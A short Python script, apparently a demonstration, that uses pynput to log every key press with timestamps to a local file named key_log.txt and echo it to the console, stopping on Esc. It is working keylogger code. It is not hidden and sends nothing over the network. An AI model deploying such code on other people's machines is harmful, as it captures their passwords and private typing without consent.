from pynput import keyboard
import logging


logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    """Called when a key is pressed."""
    try:
        logging.info(f'Key {key.char} pressed')
        print(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')
        print(f'Special key {key} pressed')

def on_release(key):
    """Called when a key is released."""
    if key == keyboard.Key.esc:
        print("Exiting...")
        return False

def main():
    """Start the keyboard listener."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
